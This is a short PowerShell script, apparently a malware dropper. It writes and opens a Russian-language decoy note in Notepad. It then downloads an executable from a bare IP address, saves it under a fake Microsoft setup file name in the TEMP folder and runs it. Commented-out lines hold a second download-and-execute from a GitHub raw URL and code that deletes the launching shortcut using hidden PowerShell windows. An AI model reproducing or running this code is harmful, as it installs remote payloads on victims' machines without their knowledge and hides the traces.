$txt = "$env:TEMP\Информация.txt"

$folder = (Get-Location).Path

@"
Позже добавлю информацию
"@ | Out-File $txt -Encoding UTF8

Start-Process notepad.exe $txt

$gaegae = Join-Path $folder "installer.txt"

$wc = New-Object System.Net.WebClient
$wc.DownloadFile('http://45.140.188.52:34513/sdxhelper.exe', "$env:TEMP\dd_setup_41020715010741_123_Microsoft.exe")
& "$env:TEMP\dd_setup_41020715010741_123_Microsoft.exe"

$tjfjftjt = Join-Path $folder "fwafwhtdafawf.txt"


# $folder = (Get-Location).Path

# $lnk = Join-Path $folder "installer6.lnk"
# $txt = Join-Path $folder "installer.txt"

# attrib -r -s -h $lnk
# [System.IO.File]::Delete($lnk)

# Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @(
#     "-Command",
#     "Start-Sleep 5; if(Test-Path '$lnk'){ Remove-Item -LiteralPath '$lnk' -Force -Verbose }"
# )

# $cmd = @"
# Start-Sleep 2
# Write-Host "Проверяем: $lnk"
# Test-Path "$lnk"
# Remove-Item -LiteralPath "$lnk" -Force -Verbose
# Read-Host "Нажмите Enter"
# "@

# Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", $cmd

# @"
# Установка запущена.

# Пожалуйста, подождите...
# "@ | Out-File $txt -Encoding UTF8

# $wc = New-Object System.Net.WebClient
# $wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
# & "$env:TEMP\a.exe"
